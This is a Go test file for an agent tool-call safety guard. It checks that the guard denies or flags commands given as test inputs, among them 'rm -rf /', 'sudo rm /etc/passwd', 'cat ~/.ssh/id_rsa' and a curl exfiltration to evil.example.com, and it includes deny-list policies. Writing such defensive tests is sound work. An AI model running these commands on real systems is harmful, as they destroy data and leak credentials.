//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2026 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safetyguard

import (
	"bytes"
	"context"
	"encoding/json"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/require"
	"trpc.group/trpc-go/trpc-agent-go/tool"
)

// fixedClock returns a deterministic timestamp for test reproducibility.
func fixedClock() time.Time {
	return time.Date(2026, 7, 15, 10, 30, 0, 0, time.UTC)
}

// mustJSONArgs marshals v to JSON or panics; convenience for building
// PermissionRequest arguments in tests.
func mustJSONArgs(t *testing.T, v any) []byte {
	t.Helper()
	b, err := json.Marshal(v)
	require.NoError(t, err)
	return b
}

// permissionReq builds a tool.PermissionRequest for the given tool name
// and JSON-encoded arguments.
func permissionReq(toolName string, args []byte) *tool.PermissionRequest {
	return &tool.PermissionRequest{
		ToolName:  toolName,
		Arguments: args,
	}
}

// scanArgs builds a scan directly from a tool name and argument map,
// skipping the PermissionRequest plumbing.
func scanArgs(g *Guard, toolName string, args any) ScanReport {
	return g.Scan(context.Background(), toolName, mustJSONArgs(&testing.T{}, args))
}

// =====================================================================
// 1. Zero policy / backward compatibility
// =====================================================================

func TestGuard_ZeroPolicy_AllowsEverything(t *testing.T) {
	g := NewGuard(SafetyPolicy{})
	decision, err := g.CheckToolPermission(
		context.Background(),
		permissionReq("workspace_exec", mustJSONArgs(t, map[string]any{
			"command": "rm -rf /",
		})),
	)
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionAllow, decision.Action)
}

// =====================================================================
// 2. Dangerous command: rm -rf
// =====================================================================

func TestGuard_DangerousCommand_Denied(t *testing.T) {
	g := NewGuard(DefaultSafetyPolicy(), WithClock(fixedClock))
	report := g.Scan(context.Background(), "workspace_exec",
		mustJSONArgs(t, map[string]any{
			"command": "rm -rf /tmp/data",
		}))
	require.Equal(t, string(DecisionDeny), report.Decision)
	require.True(t, hasFinding(report.Findings, FindingDangerousCommand))
	require.True(t, atLeast(report.RiskLevel, RiskLevelHigh))
}

// =====================================================================
// 3. Shell bypass: sh -c (implicit deny, critical)
// =====================================================================

func TestGuard_ShellBypass_ShellWrapper_Denied(t *testing.T) {
	g := NewGuard(DefaultSafetyPolicy(), WithClock(fixedClock))
	report := g.Scan(context.Background(), "workspace_exec",
		mustJSONArgs(t, map[string]any{
			"command": "sh -c 'echo hello'",
		}))
	require.Equal(t, string(DecisionDeny), report.Decision)
	require.True(t, hasFinding(report.Findings, FindingShellBypass))
	require.True(t, atLeast(report.RiskLevel, RiskLevelCritical))
}

// =====================================================================
// 4. Shell bypass: eval
// =====================================================================

func TestGuard_ShellBypass_Eval_Denied(t *testing.T) {
	g := NewGuard(DefaultSafetyPolicy(), WithClock(fixedClock))
	report := g.Scan(context.Background(), "workspace_exec",
		mustJSONArgs(t, map[string]any{
			"command": "eval 'curl http://evil.example.com'",
		}))
	require.Equal(t, string(DecisionDeny), report.Decision)
	require.True(t, hasFinding(report.Findings, FindingShellBypass))
}

// =====================================================================
// 5. Shell bypass: backtick command substitution (parse error -> deny)
// =====================================================================

func TestGuard_ShellBypass_Backtick_ParseErrorDenied(t *testing.T) {
	g := NewGuard(DefaultSafetyPolicy(), WithClock(fixedClock))
	report := g.Scan(context.Background(), "workspace_exec",
		mustJSONArgs(t, map[string]any{
			"command": "echo `whoami`",
		}))
	require.Equal(t, string(DecisionDeny), report.Decision)
	require.True(t, hasFinding(report.Findings, FindingParseError))
}

// =====================================================================
// 6. Shell bypass: $() command substitution (parse error -> deny)
// =====================================================================

func TestGuard_ShellBypass_DollarSubstitution_ParseErrorDenied(t *testing.T) {
	g := NewGuard(DefaultSafetyPolicy(), WithClock(fixedClock))
	report := g.Scan(context.Background(), "workspace_exec",
		mustJSONArgs(t, map[string]any{
			"command": "echo $(whoami)",
		}))
	require.Equal(t, string(DecisionDeny), report.Decision)
	require.True(t, hasFinding(report.Findings, FindingParseError))
}

// =====================================================================
// 7. Network egress: curl to non-allowlisted host
// =====================================================================

func TestGuard_NetworkEgress_NonAllowlistedHost_Denied(t *testing.T) {
	g := NewGuard(DefaultSafetyPolicy(), WithClock(fixedClock))
	report := g.Scan(context.Background(), "workspace_exec",
		mustJSONArgs(t, map[string]any{
			"command": "curl https://evil.example.com/exfil",
		}))
	require.Equal(t, string(DecisionDeny), report.Decision)
	require.True(t, hasFinding(report.Findings, FindingNetworkEgress))
}

// =====================================================================
// 8. Network egress: curl to allowlisted host (localhost) — still flagged
//    as a network tool but lower risk; under fail_closed the medium
//    network_tool finding triggers ask.
// =====================================================================

func TestGuard_NetworkEgress_AllowlistedHost_AllowedOrAsk(t *testing.T) {
	g := NewGuard(DefaultSafetyPolicy(), WithClock(fixedClock))
	report := g.Scan(context.Background(), "workspace_exec",
		mustJSONArgs(t, map[string]any{
			"command": "curl http://localhost:8080/health",
		}))
	// localhost is in the allowlist, so no allowed_domains finding.
	// The network_tools finding (medium) still fires; under fail_closed
	// medium triggers ask.
	require.False(t, hasFindingRule(report.Findings, "allowed_domains"))
	require.True(t, hasFinding(report.Findings, FindingNetworkEgress))
}

// =====================================================================
// 9. Dependency change: go install
// =====================================================================

func TestGuard_DependencyChange_GoInstall_Flagged(t *testing.T) {
	g := NewGuard(DefaultSafetyPolicy(), WithClock(fixedClock))
	report := g.Scan(context.Background(), "workspace_exec",
		mustJSONArgs(t, map[string]any{
			"command": "go install github.com/example/pkg@latest",
		}))
	require.True(t, hasFinding(report.Findings, FindingDependencyChange))
	// "install" subcommand lifts to high risk; under fail_closed high = deny.
	require.True(t, atLeast(report.RiskLevel, RiskLevelHigh))
	require.Equal(t, string(DecisionDeny), report.Decision)
}

// =====================================================================
// 10. Privilege escalation: sudo on workspace_exec (high)
// =====================================================================

func TestGuard_PrivilegeEscalation_Workspace_HighRisk(t *testing.T) {
	g := NewGuard(DefaultSafetyPolicy(), WithClock(fixedClock))
	report := g.Scan(context.Background(), "workspace_exec",
		mustJSONArgs(t, map[string]any{
			"command": "sudo apt-get update",
		}))
	require.True(t, hasFinding(report.Findings, FindingPrivilegeEscalate))
	require.True(t, atLeast(report.RiskLevel, RiskLevelHigh))
}

// =====================================================================
// 11. Privilege escalation: sudo on hostexec (critical)
// =====================================================================

func TestGuard_PrivilegeEscalation_HostExec_CriticalRisk(t *testing.T) {
	policy := DefaultSafetyPolicy()
	policy.HostExecTools = append(policy.HostExecTools, "hostexec")
	g := NewGuard(policy, WithClock(fixedClock))
	report := g.Scan(context.Background(), "hostexec",
		mustJSONArgs(t, map[string]any{
			"command": "sudo rm /etc/passwd",
		}))
	require.True(t, report.HostExec)
	require.True(t, hasFinding(report.Findings, FindingPrivilegeEscalate))
	require.Equal(t, RiskLevelCritical, report.RiskLevel)
	require.Equal(t, string(DecisionDeny), report.Decision)
}

// =====================================================================
// 12. Forbidden path: ~/.ssh in arguments
// =====================================================================

func TestGuard_ForbiddenPath_SSHKey_Detected(t *testing.T) {
	g := NewGuard(DefaultSafetyPolicy(), WithClock(fixedClock))
	report := g.Scan(context.Background(), "workspace_exec",
		mustJSONArgs(t, map[string]any{
			"command": "cat ~/.ssh/id_rsa",
		}))
	require.True(t, hasFinding(report.Findings, FindingForbiddenPath))
	require.True(t, atLeast(report.RiskLevel, RiskLevelHigh))
}

// =====================================================================
// 13. Sensitive information: API key in arguments
// =====================================================================

func TestGuard_SensitiveInfo_APIKey_Detected(t *testing.T) {
	g := NewGuard(DefaultSafetyPolicy(), WithClock(fixedClock))
	report := g.Scan(context.Background(), "workspace_exec",
		mustJSONArgs(t, map[string]any{
			"command": "echo sk-abcdefghijklmnopqrstuvwxyz1234567890",
		}))
	require.True(t, hasFinding(report.Findings, FindingSensitiveInfo))
}

// =====================================================================
// 14. Resource abuse: timeout exceeds max
// =====================================================================

func TestGuard_ResourceAbuse_TimeoutExceeded(t *testing.T) {
	g := NewGuard(DefaultSafetyPolicy(), WithClock(fixedClock))
	report := g.Scan(context.Background(), "workspace_exec",
		mustJSONArgs(t, map[string]any{
			"command": "sleep 10",
			"timeout": 9999,
		}))
	require.True(t, hasFindingRule(report.Findings, "max_timeout_seconds"))
}

// =====================================================================
// 15. Environment violation: denied env var
// =====================================================================

func TestGuard_EnvironmentViolation_DeniedVar(t *testing.T) {
	policy := DefaultSafetyPolicy()
	policy.Environment.DeniedVars = []string{"SECRET_TOKEN"}
	g := NewGuard(policy, WithClock(fixedClock))
	report := g.Scan(context.Background(), "workspace_exec",
		mustJSONArgs(t, map[string]any{
			"command": "echo hi",
			"env": map[string]any{
				"SECRET_TOKEN": "abc123",
			},
		}))
	require.True(t, hasFindingRule(report.Findings, "denied_vars"))
}

// =====================================================================
// 16. Environment violation: var not in allowlist
// =====================================================================

func TestGuard_EnvironmentViolation_NotInAllowedVars(t *testing.T) {
	policy := DefaultSafetyPolicy()
	policy.Environment.AllowedVars = []string{"LANG", "TZ"}
	g := NewGuard(policy, WithClock(fixedClock))
	report := g.Scan(context.Background(), "workspace_exec",
		mustJSONArgs(t, map[string]any{
			"command": "echo hi",
			"env": map[string]any{
				"UNEXPECTED_VAR": "value",
			},
		}))
	require.True(t, hasFindingRule(report.Findings, "allowed_vars"))
}

// =====================================================================
// 17. Advisory mode: records findings but allows unless critical
// =====================================================================

func TestGuard_AdvisoryMode_AllowsUnlessCritical(t *testing.T) {
	policy := DefaultSafetyPolicy()
	policy.Decision.Mode = DecisionModeAdvisory
	g := NewGuard(policy, WithClock(fixedClock))
	// rm is high risk; advisory mode allows unless critical.
	report := g.Scan(context.Background(), "workspace_exec",
		mustJSONArgs(t, map[string]any{
			"command": "rm -rf /tmp/data",
		}))
	require.True(t, hasFinding(report.Findings, FindingDangerousCommand))
	require.Equal(t, string(DecisionAllow), report.Decision)
}

// =====================================================================
// 18. Parse error: ask mode
// =====================================================================

func TestGuard_ParseError_AskMode(t *testing.T) {
	policy := DefaultSafetyPolicy()
	policy.Decision.OnParseError = ParseErrorAsk
	g := NewGuard(policy, WithClock(fixedClock))
	report := g.Scan(context.Background(), "workspace_exec",
		mustJSONArgs(t, map[string]any{
			"command": "echo `whoami`",
		}))
	require.Equal(t, string(DecisionAsk), report.Decision)
	require.True(t, hasFinding(report.Findings, FindingParseError))
}

// =====================================================================
// 19. Audit writer writes structured events
// =====================================================================

func TestGuard_AuditWriter_WritesEvents(t *testing.T) {
	var buf bytes.Buffer
	audit := NewAuditWriter(&buf)
	g := NewGuard(DefaultSafetyPolicy(),
		WithClock(fixedClock),
		WithAuditWriter(audit),
	)
	_, _ = g.CheckToolPermission(
		context.Background(),
		permissionReq("workspace_exec", mustJSONArgs(t, map[string]any{
			"command": "rm -rf /tmp",
		})),
	)
	lines := strings.Split(strings.TrimSpace(buf.String()), "\n")
	require.Len(t, lines, 1)
	var event AuditEvent
	require.NoError(t, json.Unmarshal([]byte(lines[0]), &event))
	require.Equal(t, "workspace_exec", event.ToolName)
	require.Equal(t, "deny", event.Decision)
	require.NotEmpty(t, event.Findings)
}

// =====================================================================
// 20. Load policy from YAML
// =====================================================================

func TestGuard_LoadPolicy_YAML(t *testing.T) {
	yamlDoc := []byte(`
version: "safetyguard/v1"
commands:
  denied:
    - rm
    - dd
  dependency_changes:
    - go
    - pip
forbidden_paths:
  - "~/.ssh"
network:
  enabled: true
  allowed_domains:
    - localhost
    - "127.0.0.1"
resource_limits:
  max_timeout_seconds: 300
  max_output_bytes: 524288
environment:
  allowed_vars:
    - LANG
    - TZ
sensitive_info:
  enabled: true
  deny_on_detect: false
decision:
  mode: fail_closed
  on_parse_error: deny
  risk_threshold_ask: medium
  risk_threshold_deny: high
`)
	policy, err := ParsePolicy(yamlDoc, FormatYAML)
	require.NoError(t, err)
	require.True(t, policy.Active())
	require.Equal(t, "safetyguard/v1", policy.Version)
	require.Contains(t, policy.Commands.Denied, "rm")
	require.Contains(t, policy.Network.AllowedDomains, "localhost")
	require.Equal(t, 300, policy.ResourceLimits.MaxTimeoutSeconds)

	g := NewGuard(policy, WithClock(fixedClock))
	report := g.Scan(context.Background(), "workspace_exec",
		mustJSONArgs(t, map[string]any{
			"command": "rm -rf /tmp",
		}))
	require.Equal(t, string(DecisionDeny), report.Decision)
}

// =====================================================================
// 21. Load policy from JSON
// =====================================================================

func TestGuard_LoadPolicy_JSON(t *testing.T) {
	jsonDoc := []byte(`{
  "version": "safetyguard/v1",
  "commands": {
    "denied": ["rm", "dd"],
    "dependency_changes": ["go", "pip"]
  },
  "forbidden_paths": ["~/.ssh"],
  "network": {
    "enabled": true,
    "allowed_domains": ["localhost", "127.0.0.1"]
  },
  "resource_limits": {
    "max_timeout_seconds": 300,
    "max_output_bytes": 524288
  },
  "environment": {
    "allowed_vars": ["LANG", "TZ"]
  },
  "sensitive_info": {
    "enabled": true,
    "deny_on_detect": false
  },
  "decision": {
    "mode": "fail_closed",
    "on_parse_error": "deny",
    "risk_threshold_ask": "medium",
    "risk_threshold_deny": "high"
  }
}`)
	policy, err := ParsePolicy(jsonDoc, FormatJSON)
	require.NoError(t, err)
	require.True(t, policy.Active())
	require.Contains(t, policy.Commands.Denied, "rm")
}

// =====================================================================
// 22. HostExec escalation: medium finding becomes high on hostexec
// =====================================================================

func TestGuard_HostExec_RiskEscalation(t *testing.T) {
	policy := DefaultSafetyPolicy()
	policy.HostExecTools = []string{"hostexec"}
	g := NewGuard(policy, WithClock(fixedClock))

	// "go build" is a dependency-change finding at medium (no "install").
	// On hostexec it should be escalated to high.
	report := g.Scan(context.Background(), "hostexec",
		mustJSONArgs(t, map[string]any{
			"command": "go build ./...",
		}))
	require.True(t, report.HostExec)
	require.True(t, hasFinding(report.Findings, FindingDependencyChange))
	// Escalated from medium to high on hostexec.
	require.True(t, atLeast(report.RiskLevel, RiskLevelHigh))
}

// =====================================================================
// 23. ScanReport JSON serialization round-trip
// =====================================================================

func TestScanReport_JSONRoundTrip(t *testing.T) {
	g := NewGuard(DefaultSafetyPolicy(), WithClock(fixedClock))
	original := g.Scan(context.Background(), "workspace_exec",
		mustJSONArgs(t, map[string]any{
			"command": "rm -rf /tmp",
		}))
	data, err := json.Marshal(original)
	require.NoError(t, err)
	var restored ScanReport
	require.NoError(t, json.Unmarshal(data, &restored))
	require.Equal(t, original.Decision, restored.Decision)
	require.Equal(t, original.RiskLevel, restored.RiskLevel)
	require.Equal(t, original.ToolName, restored.ToolName)
	require.Len(t, restored.Findings, len(original.Findings))
}

// =====================================================================
// 24. Permission decision mapping
// =====================================================================

func TestGuard_CheckToolPermission_DecisionMapping(t *testing.T) {
	g := NewGuard(DefaultSafetyPolicy(), WithClock(fixedClock))

	// Deny case: rm is in the deny list.
	decision, err := g.CheckToolPermission(
		context.Background(),
		permissionReq("workspace_exec", mustJSONArgs(t, map[string]any{
			"command": "rm -rf /tmp",
		})),
	)
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	require.NotEmpty(t, decision.Reason)

	// Ask case: parse error with ask mode.
	policy := DefaultSafetyPolicy()
	policy.Decision.OnParseError = ParseErrorAsk
	gAsk := NewGuard(policy, WithClock(fixedClock))
	decision, err = gAsk.CheckToolPermission(
		context.Background(),
		permissionReq("workspace_exec", mustJSONArgs(t, map[string]any{
			"command": "echo `whoami`",
		})),
	)
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionAsk, decision.Action)
	require.NotEmpty(t, decision.Reason)
}

// =====================================================================
// 25. OpenTelemetry span attributes are set when a span is active
// =====================================================================

func TestGuard_SpanAttributes_SetOnRecordingSpan(t *testing.T) {
	// This test verifies the span attribute keys are exported and the
	// recordSpan function does not panic when called with a background
	// context (no active span). A full tracer test would require an
	// exporter; the key contract is that the constants exist and the
	// function is safe to call.
	require.Equal(t, "tool.safety.decision", SpanAttrDecision)
	require.Equal(t, "tool.safety.risk_level", SpanAttrRiskLevel)
	require.Equal(t, "tool.safety.finding_count", SpanAttrFindingCount)
	require.Equal(t, "tool.safety.finding_types", SpanAttrFindingTypes)
	require.Equal(t, "tool.safety.policy_version", SpanAttrPolicyVersion)
	require.Equal(t, "tool.safety.host_exec", SpanAttrHostExec)

	// recordSpan must be safe with a nil-ish span (background context).
	recordSpan(context.Background(), ScanReport{
		Decision:  "allow",
		RiskLevel: RiskLevelNone,
	})
}

// =====================================================================
// 26. Nil request is allowed
// =====================================================================

func TestGuard_NilRequest_Allowed(t *testing.T) {
	g := NewGuard(DefaultSafetyPolicy())
	decision, err := g.CheckToolPermission(context.Background(), nil)
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionAllow, decision.Action)
}

// =====================================================================
// 27. Policy validation rejects unknown mode
// =====================================================================

func TestSafetyPolicy_Validate_RejectsUnknownMode(t *testing.T) {
	p := SafetyPolicy{
		Decision: DecisionConfig{
			Mode:         "bogus",
			OnParseError: ParseErrorDeny,
		},
	}
	err := p.withDefaults().Validate()
	require.Error(t, err)
	require.Contains(t, err.Error(), "unknown decision mode")
}

// =====================================================================
// 28. Allowed command list restricts execution
// =====================================================================

func TestGuard_AllowedCommands_RestrictsExecution(t *testing.T) {
	policy := DefaultSafetyPolicy()
	policy.Commands.Allowed = []string{"ls", "cat", "echo"}
	g := NewGuard(policy, WithClock(fixedClock))

	// "ls" is allowed.
	report := g.Scan(context.Background(), "workspace_exec",
		mustJSONArgs(t, map[string]any{
			"command": "ls -la /tmp",
		}))
	// ls is allowed, but the policy is active so it still gets scanned.
	// No deny finding from the allowed list.
	for _, f := range report.Findings {
		if f.Rule == "allowed_commands" {
			t.Fatalf("ls should be in allowed list, got finding: %s", f.Detail)
		}
	}

	// "git" is not in the allowed list.
	report = g.Scan(context.Background(), "workspace_exec",
		mustJSONArgs(t, map[string]any{
			"command": "git status",
		}))
	require.True(t, hasFindingRule(report.Findings, "allowed_commands"))
}

// =====================================================================
// Helpers
// =====================================================================

func hasFinding(findings []Finding, findingType string) bool {
	for _, f := range findings {
		if f.Type == findingType {
			return true
		}
	}
	return false
}

func hasFindingRule(findings []Finding, rule string) bool {
	for _, f := range findings {
		if f.Rule == rule {
			return true
		}
	}
	return false
}
